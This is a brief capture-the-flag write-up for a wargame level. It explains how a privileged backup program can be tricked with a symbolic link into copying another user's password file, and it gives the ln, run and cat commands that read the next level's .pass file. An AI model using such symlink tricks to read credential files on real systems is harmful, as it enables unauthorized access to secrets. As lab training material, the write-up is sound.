## Brief
This program is pretty simple as no over-complicated exploit is necessary to get access to the flag.
This program open and write some logs in a file located at ./backup/logs and copy the file as parameter in the `backup` folder.

## Exploit
In order to be able to read we could simply do:
```bash
./level08 /home/users/level09/.pass
```
or
```bash
./level08 ../level09/.pass
```
But the file cannot be created in the `backup` folder.

The trick is to create a simlink pointing to the `.pass` file in order to be able to create a file in the backup folder.

## Commands
 
```bash
ln -s ../level09/.pass test
./level08 test
cat ./backups/test
```